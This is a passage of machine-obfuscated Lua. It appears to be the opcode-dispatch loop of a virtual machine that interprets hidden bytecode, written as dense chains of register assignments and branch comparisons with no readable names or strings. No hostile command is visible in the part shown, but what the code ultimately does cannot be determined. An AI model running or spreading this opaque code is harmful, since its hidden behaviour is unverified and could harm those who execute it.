ba;w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif 131>z then local ba=w[y[684]]+y[404];w[y[684]]=ba;if(ba<=w[y[684]+1])then n=y[897];end;else local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;end;elseif 137>=z then if z<=134 then if z<=132 then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]]*y[404];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif 134>z then local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;else a(c,e);end;elseif z<=135 then local ba;w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif 136==z then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else w[y[684]]();end;elseif 140>=z then if z<=138 then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then w[y[684]][y[897]]=y[404];else n=n+1;end else if ba<=2 then y=f[n];else if ba~=4 then w[y[684]]={};else n=n+1;end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[684]][y[897]]=w[y[404]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[684]]=h[y[897]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[684]]=w[y[897]][y[404]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then w[y[684]][y[897]]=w[y[404]];else n=n+1;end else if ba<=17 then y=f[n];else if 19~=ba then w[y[684]][y[897]]=w[y[404]];else break end end end end end ba=ba+1 end elseif 140~=z then local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=141 then if(y[684]<w[y[404]]or y[684]==w[y[404]])then n=n+1;else n=y[897];end;elseif 143~=z then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 167>=z then if z<=155 then if 149>=z then if 146>=z then if z<=144 then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 4<ba then w[y[684]]=false;else y=f[n];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 8>ba then y=f[n];else w[y[684]]=j[y[897]];end end else if ba<=10 then if ba==9 then n=n+1;else y=f[n];end else if 12~=ba then for bc=y[684],y[897],1 do w[bc]=nil;end;else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba>14 then n=n+1;else w[y[684]]=h[y[897]];end end else if ba<=16 then y=f[n];else if 17<ba then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end end else if ba<=21 then if ba<=19 then y=f[n];else if ba<21 then w[y[684]]=w[y[897]];else n=n+1;end end else if ba<=23 then if ba==22 then y=f[n];else bb=y[684]end else if ba~=25 then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif 145==z then local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];bc=y[684]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[404]do ba=ba+1;w[bd]=bb[ba];end else if(w[y[684]]~=w[y[404]])then n=y[897];else n=n+1;end;end;elseif z<=147 then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])elseif 148==z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 152>=z then if z<=150 then local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif 152>z then local ba=y[684];w[ba]=w[ba]-w[ba+2];n=y[897];else local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 153>=z then local ba=y[684]local bb,bc=i(w[ba](r(w,ba+1,y[897])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif z<155 then w[y[684]]={r({},1,y[897])};else w[y[684]]=h[y[897]];end;elseif 161>=z then if z<=158 then if z<=156 then local ba=w[y[404]];if not ba then n=n+1;else w[y[684]]=ba;n=y[897];end;elseif z<158 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684];w[ba]=w[ba]-w[ba+2];n=y[897];else local ba;local bb,bc;local bd;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];bd=y[684]bb,bc=i(w[bd](r(w,bd+1,y[897])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif z<=159 then local ba;w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))elseif 160==z then w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;else local ba=y[684];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;end;elseif z<=164 then if(162>z or 162==z)then if(w[y[684]]==w[y[404]]or w[y[684]]<w[y[404]])then n=y[897];else n=n+1;end;elseif(z>163)then local ba=y[684];do return w[ba](r(w,ba+1,y[897]))end;else w[y[684]]=j[y[897]];end;elseif 165>=z then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then w[y[684]][y[897]]=y[404];else n=n+1;end else if ba<=2 then y=f[n];else if ba~=4 then w[y[684]]={};else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[684]][y[897]]=w[y[404]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[684]]=h[y[897]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[684]]=w[y[897]][y[404]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15==ba then w[y[684]][y[897]]=w[y[404]];else n=n+1;end else if ba<=17 then y=f[n];else if 18==ba then w[y[684]][y[897]]=w[y[404]];else break end end end end end ba=ba+1 end elseif 166<z then local ba;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else w[y[684]]=false;n=n+1;end;elseif z<=179 then if z<=173 then if z<=170 then if z<=168 then w[y[684]]=y[897]*w[y[404]];elseif z<170 then if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;else local ba=y[684]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[404]do bc=bc+1;w[bd]=bb[bc];end end;elseif 171>=z then if(w[y[684]]~=w[y[404]])then n=y[897];else n=n+1;end;elseif 173~=z then local ba;w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][w[y[404]]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;end;elseif z<=176 then if 174>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+y[404];n=n+1;y=f[n];h[y[897]]=w[y[684]];n=n+1;y=f[n];do return end;n=n+1;y=f[n];do return end;elseif 175==z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]]*y[404];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]]+w[y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))else local ba;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()end;elseif 177>=z then local ba;w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=false;n=n+1;y=f[n];ba=y[684]w[ba](w[ba+1])elseif 178==z then local ba;local bb;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]={r({},1,y[897])};n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];bb=y[684];ba=w[bb];for bc=bb+1,y[897]do t(ba,w[bc])end;else local ba;local bb;local bc;w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];bc=y[897];bb=y[404];ba=k(w,g,bc,bb);w[y[684]]=ba;end;elseif 185>=z then if z<=182 then if 180>=z then local ba;w[y[684]]={};n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba]()elseif z>181 then n=y[897];else local ba;w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=183 then w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;elseif 184<z then w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;else local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif 188>=z then if z<=186 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[684]]=w[y[897]][y[404]];end end end end else if ba<=13 then if ba<=10 then if 9<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end else if ba<=11 then n=n+1;else if 12<ba then w[y[684]]=false;else y=f[n];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[684]else if ba>17 then break else w[bb](w[bb+1])end end end end end ba=ba+1 end elseif 187<z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]]={};n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if w[y[684]]then n=n+1;else n=y[897];end;else if w[y[684]]then n=n+1;else n=y[897];end;end;elseif 190>=z then if 190~=z then w[y[684]]=w[y[897]]+y[404];else w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]][y[897]]=w[y[404]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];if(w[y[684]]~=w[y[404]])then n=n+1;else n=y[897];end;end;elseif 191==z then local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=h[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](w[ba+1])else local ba;w[y[684]]=j[y[897]];n=n+1;y=f[n];w[y[684]]=w[y[897]][y[404]];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];w[y[684]]=y[897];n=n+1;y=f[n];ba=y[684]w[ba]=w[ba](r(w,ba+1,y[897]))end;elseif z<=288 then if(240>=z)then if((216>z)or not(216~=z))then if(not(204~=z)or 204>z)then if((198==z)or(198>z))then if(z<=195)then if(not(193~=z)or 193>z)then local ba,bb,bc,bd=0 while true do if((ba<9)or not(ba~=9))then if(ba==4 or ba<4)then if(not(ba~=1)or(ba<1))then if(0<ba)then bc=nil else bb=nil end else if(ba<2 or ba==2)then bd=nil else if not(ba==4)then w[y[684]]=h[y[897]];else n=(n+1);end end end else if(ba<6 or ba==6)then if not(not(5==ba))then y=f[n];else w[y[684]]=h[y[897]];end else if(ba==7 or ba<7)then n=n+1;else if(8<ba)then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end end else if(ba==14 or ba<14)then if(ba==11 or ba<11)then if(10<ba)then y=f[n];else n=(n+1);end else if((ba<12)or(ba==12))then w[y[684]]=w[y[897]][w[y[404]]];else if(ba>13)then y=f[n];else n=(n+1);end end end else if(ba<=16)then if not(15~=ba)then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba==17 or ba<17)then bb=0;else if not(19==ba)then for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end else break end end end end end ba=(ba+1)end elseif z<195 then w[y[684]]=w[y[897]]+w[y[404]];else local ba,bb=0 while true do if(ba<7 or ba==7)then if(ba<3 or not(ba~=3))then if ba<=1 then if ba>0 then w[y[684]][y[897]]=w[y[404]];else bb=nil end else if ba>2 then y=f[n];else n=(n+1);end end else if(ba<5 or ba==5)then if(4<ba)then n=n+1;else w[y[684]]={};end else if not(ba~=6)then y=f[n];else w[y[684]][y[897]]=y[404];end end end else if(ba<11 or ba==11)then if(ba<9 or not(ba~=9))then if(8<ba)then y=f[n];else n=(n+1);end else if(11>ba)then w[y[684]][y[897]]=w[y[404]];else n=(n+1);end end else if(ba<13 or ba==13)then if not(ba~=12)then y=f[n];else bb=y[684]end else if ba<15 then w[bb]=w[bb](r(w,(bb+1),y[897]))else break end end end end ba=(ba+1)end end;elseif(z==196 or(z<196))then if(w[y[684]]==w[y[404]]or w[y[684]]<w[y[404]])then n=(n+1);else n=y[897];end;elseif not(z==198)then local ba,bb,bc=0 while true do if(ba<8 or ba==8)then if(ba==3 or ba<3)then if(ba==1 or ba<1)then if ba<1 then bb=nil else bc=nil end else if(2<ba)then n=n+1;else w[y[684]]=y[897];end end else if(ba==5 or ba<5)then if not(not(ba==4))then y=f[n];else w[y[684]]=w[y[897]][w[y[404]]];end else if(ba==6 or ba<6)then n=(n+1);else if 7<ba then w[y[684]]=j[y[897]];else y=f[n];end end end end else if(ba<13 or not(ba~=13))then if(ba<=10)then if not(9~=ba)then n=(n+1);else y=f[n];end else if(ba<11 or ba==11)then w[y[684]]=y[897];else if(13~=ba)then n=(n+1);else y=f[n];end end end else if(ba==15 or ba<15)then if 15~=ba then bc=y[684];else bb=w[y[897]];end else if(ba<16 or ba==16)then w[(bc+1)]=bb;else if not(ba==18)then w[bc]=bb[w[y[404]]];else break end end end end end ba=(ba+1)end else local ba,bb=0 while true do if(ba<=12)then if(ba<=5)then if(ba==2 or ba<2)then if(ba<0 or not(ba~=0))then bb=nil else if(ba~=2)then w={};else for bc=0,u,1 do if(bc<o)then w[bc]=s[(bc+1)];else break;end;end;end end else if((ba<3)or(ba==3))then n=(n+1);else if not(ba~=4)then y=f[n];else w[y[684]]=h[y[897]];end end end else if(ba==8 or ba<8)then if(ba<=6)then n=(n+1);else if(ba<8)then y=f[n];else w[y[684]]=j[y[897]];end end else if(ba==10 or ba<10)then if(10~=ba)then n=n+1;else y=f[n];end else if(ba<12)then w[y[684]]=w[y[897]][y[404]];else n=(n+1);end end end end else if(ba<18 or ba==18)then if(ba==15 or ba<15)then if(ba<13 or ba==13)then y=f[n];else if not(not(14==ba))then w[y[684]]=y[897];else n=(n+1);end end else if(ba==16 or ba<16)then y=f[n];else if(ba>17)then n=n+1;else w[y[684]]=y[897];end end end else if(ba==21 or ba<21)then if(ba<19 or ba==19)then y=f[n];else if(ba>20)then n=n+1;else w[y[684]]=y[897];end end else if(ba<=23)then if not(ba==23)then y=f[n];else bb=y[684]end else if(24<ba)then break else w[bb]=w[bb](r(w,(bb+1),y[897]))end end end end end ba=(ba+1)end end;elseif(z<201 or z==201)then if(199>z or 199==z)then w[y[684]]=(not w[y[897]]);elseif not(not(not(z==201)))then local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba<3 or ba==3)then if(ba==1 or ba<1)then if not(1==ba)then bb=nil else w[y[684]]=h[y[897]];end else if(ba>2)then y=f[n];else n=n+1;end end else if(ba<=5)then if not(ba==5)then w[y[684]]=y[897];else n=(n+1);end else if(ba==6)then y=f[n];else w[y[684]]=y[897];end end end else if(ba==11 or ba<11)then if(not(ba~=9)or ba<9)then if not(ba~=8)then n=(n+1);else y=f[n];end else if(not(ba~=10))then w[y[684]]=y[897];else n=n+1;end end else if((ba<13)or ba==13)then if(ba<13)then y=f[n];else bb=y[684]end else if not(ba==15)then w[bb]=w[bb](r(w,bb+1,y[897]))else break end end end end ba=(ba+1)end else local ba=0 while true do if(ba==6 or ba<6)then if(ba<2 or ba==2)then if(ba==0 or ba<0)then w[y[684]]=w[y[897]][y[404]];else if(1==ba)then n=(n+1);else y=f[n];end end else if(ba<4 or ba==4)then if(not(4==ba))then w[y[684]]=w[y[897]][y[404]];else n=n+1;end else if not(ba~=5)then y=f[n];else w[y[684]]=w[y[897]][y[404]];end end end else if(ba==9 or ba<9)then if(ba==7 or ba<7)then n=(n+1);else if 8<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end else if(not(ba~=11)or(ba<11))then if(11~=ba)then n=(n+1);else y=f[n];end else if 13>ba then if w[y[684]]then n=(n+1);else n=y[897];end;else break end end end end ba=(ba+1)end end;elseif(z<202 or z==202)then local ba,bb,bc,bd=0 while true do if(ba==9 or ba<9)then if(ba==4 or ba<4)then if((not(ba~=1))or ba<1)then if(not(0~=ba))then bb=nil else bc=nil end else if(not(ba~=2)or(ba<2))then bd=nil else if not(not(ba==3))then w[y[684]]=h[y[897]];else n=n+1;end end end else if(ba<6 or not(ba~=6))then if(ba>5)then w[y[684]]=h[y[897]];else y=f[n];end else if(ba<7 or ba==7)then n=(n+1);else if 8<ba then w[y[684]]=w[y[897]][y[404]];else y=f[n];end end end end else if(not(ba~=14)or ba<14)then if(ba==11 or ba<11)then if(11>ba)then n=(n+1);else y=f[n];end else if(ba<12 or ba==12)then w[y[684]]=w[y[897]][w[y[404]]];else if(14>ba)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if(16>ba)then bd=y[684]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if(ba>18)then break else for be=bd,y[404]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=ba+1 end elseif(not(203~=z))then do return w[y[684]]end else w[y[684]]={};end;elseif(not(z~=210)or(z<210))then if(not(z~=207)or(z<207))then if(not(205~=z)or(205>z))then local ba,bb=0 while true do if(ba<=7)then if(ba<3 or ba==3)then if((ba==1)or(ba<1))then if not(not(ba==0))then bb=nil else w[y[684]]=w[y[897]][y[404]];end else if 3>ba then n=(n+1);else y=f[n];end end else if(not(ba~=5)or(ba<5))then if(ba<5)then w[y[684]]=y[897];else n=(n+1);end else if(6<ba)then w[y[684]]=y[897];else y=f[n];end end end else if(ba<=11)then if(ba<=9)then if(ba==8)then n=(n+1);else y=f[n];end else 